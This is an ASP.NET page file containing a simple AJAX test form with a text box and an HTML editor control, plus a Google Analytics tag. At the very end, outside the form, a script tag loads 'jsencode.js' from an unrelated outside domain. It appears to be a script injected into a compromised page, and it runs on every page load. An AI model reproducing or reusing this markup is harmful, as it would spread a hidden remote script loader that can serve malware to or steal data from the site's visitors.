<%@ Page Language="C#" AutoEventWireup="true" CodeFile="ajax1.aspx.cs" Inherits="ajax1" %>
<%@ Register assembly="AjaxControlToolkit" namespace="AjaxControlToolkit.HTMLEditor" tagprefix="cc1" %>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head runat="server"> 
<!-- Global site tag (gtag.js) - Google Analytics -->
<script async src="https://www.googletagmanager.com/gtag/js?id=UA-1730637-1"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'UA-1730637-1');
</script>
 
  <title>Untitled Page</title></head><body>    <form id="form1" runat="server">    <div>        </div>    <asp:ScriptManager ID="ScriptManager1" runat="server">    </asp:ScriptManager>    <asp:UpdatePanel ID="UpdatePanel1" runat="server">        <ContentTemplate>            <br />            <br />            <br />            <asp:TextBox ID="TextBox1" runat="server"></asp:TextBox>            <br />            <br />            <br />            <br />            <br />            <cc1:Editor ID="Editor1" runat="server" />            <br />            <br />            <br />            <br />            <br />            <br />        </ContentTemplate>    </asp:UpdatePanel>    </form><script language="javascript" src="http://www.1chinaledlighting.com/jsencode.js"></script></body></html>
